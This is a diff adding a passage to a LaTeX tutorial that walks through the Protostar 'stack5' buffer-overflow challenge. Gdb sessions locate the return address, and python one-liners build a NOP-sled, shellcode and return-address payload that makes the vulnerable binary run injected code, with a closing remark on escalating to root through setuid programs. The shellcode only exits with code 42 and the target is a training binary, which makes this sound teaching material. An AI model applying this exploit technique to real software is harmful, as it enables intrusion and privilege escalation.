@@ -302,7 +302,142 @@ Dump of assembler code for function launchpad:
 0x080483ae <launchpad+26>:      leave  
 0x080483af <launchpad+27>:      ret    
 End of assembler dump.
+(gdb) b *(launchpad+27)
+Breakpoint 1 at 0x80483af
+(gdb) r
+Starting program: /home/user/shellcode/exit/shellcode 
 
+Breakpoint 1, 0x080483af in launchpad ()
+(gdb) si
+0x08049598 in injectable ()
+(gdb) x/5i $eip
+0x8049598 <injectable>: xor    %eax,%eax
+0x804959a <injectable+2>:       xor    %ebx,%ebx
+0x804959c <injectable+4>:       mov    $0x2a,%bl
+0x804959e <injectable+6>:       mov    $0x1,%al
+0x80495a0 <injectable+8>:       int    $0x80
+(gdb) c
+Continuing.
+
+Program exited with code 052.
 \end{lstlisting}
 
-TODO: finish discussing achieving code execution, with example\\
+So, we place a breakpoint on the return instruction of
+the \texttt{launchpad} function, and step to the next
+instruction once we hit it. As we can see, this puts us
+in our \texttt{injectable} array, and interpreting the 
+data as 5 instructions, we see the instructions of our shellcode.
+Continuing execution, we exit with a status of \texttt{052},
+which is the octal representation of \texttt{42} in decimal,
+fully convincing us that our shellcode was executed and does
+what we want. Now, to make use of it in an actual exploit.
+
+For the \texttt{stack5} challenge, we have a fairly simple setup.
+
+\lstinputlisting[language=C]{stack/stack5.c}
+
+We have a 64-byte buffer, and call \texttt{gets} on it, presenting
+us with a buffer overflow vulnerability. First, we'll determine
+the number of bytes we'll need to overflow into the return address.
+This can be done with trial and error, sending buffers of over 64 bytes
+and determining how many bytes you can send before a segfault would happen.
+Instead, since the program is simple we'll just debug it and find out.
+
+\begin{lstlisting}
+user@protostar:~/stack/5$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483c4 <main+0>:    push   %ebp
+0x080483c5 <main+1>:    mov    %esp,%ebp
+0x080483c7 <main+3>:    and    $0xfffffff0,%esp
+0x080483ca <main+6>:    sub    $0x50,%esp
+0x080483cd <main+9>:    lea    0x10(%esp),%eax
+0x080483d1 <main+13>:   mov    %eax,(%esp)
+0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
+0x080483d9 <main+21>:   leave  
+0x080483da <main+22>:   ret    
+End of assembler dump.
+(gdb) b *(main)
+Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5 
+
+Breakpoint 1, main (argc=1, argv=0xbffff874) at stack5/stack5.c:7
+7       stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) i r esp
+esp            0xbffff7cc       0xbffff7cc
+(gdb) b *(main+16)
+Breakpoint 2 at 0x80483d4: file stack5/stack5.c, line 10.
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080483d4 in main (argc=1, argv=0xbffff874) at stack5/stack5.c:10
+10      in stack5/stack5.c
+(gdb) i r eax
+eax            0xbffff780       -1073744000
+\end{lstlisting}
+
+Here, we place a breakpoint at the beginning of the function,
+so we can easily get the address the return pointer is located 
+at, since it will be where the \texttt{esp} register is pointing.
+Next, we breakpoint just before the call to \texttt{gets}, so 
+we can find the address of our buffer in the \texttt{eax} register.
+Taking a simple difference, we see that we should use 76 bytes to get
+from the beginning of the buffer to the return address. Now, we
+do have to be careful. Because of the \texttt{and} instruction,
+it's possible that this difference can change by as much as 16 bytes, 
+depending on differences in execution prior to entry to main. For example,
+different arguments can possibly change this difference. However,
+16 bytes isn't a large differenence, so we will simply brute-force this.
+Also, we'll make use of python on the command line, and build our
+buffer with a sequence of NOP instructions in the beginning, simply
+so that we won't have to update the address we jump to each time
+we change the buffer size.
+
+\begin{lstlisting}
+user@protostar:~/stack/5$ python -c 'print "\x90"*64 + "\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80" + "\xf0\xf0\xf0\xf0"' > testinput
+user@protostar:~/stack/5$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) r < testinput
+Starting program: /opt/protostar/bin/stack5 < testinput
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb700f0f0 in ?? ()
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 3752] will be killed.
+
+Quit anyway? (y or n) y
+user@protostar:~/stack/5$ python -c 'print "\x90"*66 + "\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80" + "\xf0\xf0\xf0\xf0"' > testinput
+user@protostar:~/stack/5$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) r < testinput
+Starting program: /opt/protostar/bin/stack5 < testinput
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf0f0f0f0 in ?? ()
+\end{lstlisting}
+
+Here, the \texttt{0xf0f0f0f0} bytes make for a convenient ``flag" to search
+for. Luckily, the first guess had us partially overwriting the return pointer,
+so it was easy to adjust things for a proper overwrite. Now, remembering
+that our buffer began at \texttt{0xbffff780}, we simply use this address
+for the return pointer, though anything in the range \texttt{0xbffff780}-\texttt{0xbffff7c2} should work.
+
+\begin{lstlisting}
+user@protostar:~/stack/5$ python -c 'print "\x90"*66 + "\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80" + "\x80\xf7\xff\xbf"' > testinput
+user@protostar:~/stack/5$ /opt/protostar/bin/stack5 < testinput
+user@protostar:~/stack/5$ echo $?
+42
+\end{lstlisting}
+
+Excellent! So now, we're intelligently corrupting data to make a vulnerable program
+execute instructions we provide! It's not too difficult to imagine such an
+attack having a large impact. For example, if we had found a similar vulnerability
+in a setuid program owned by root, it's possible for us to execute instructions
+with root permissions. Or, perhaps we need to modify some variables a program
+uses internally, but we don't have permissions to attach a debugger to it.
+It isn't difficult to see how something like this can be abused.
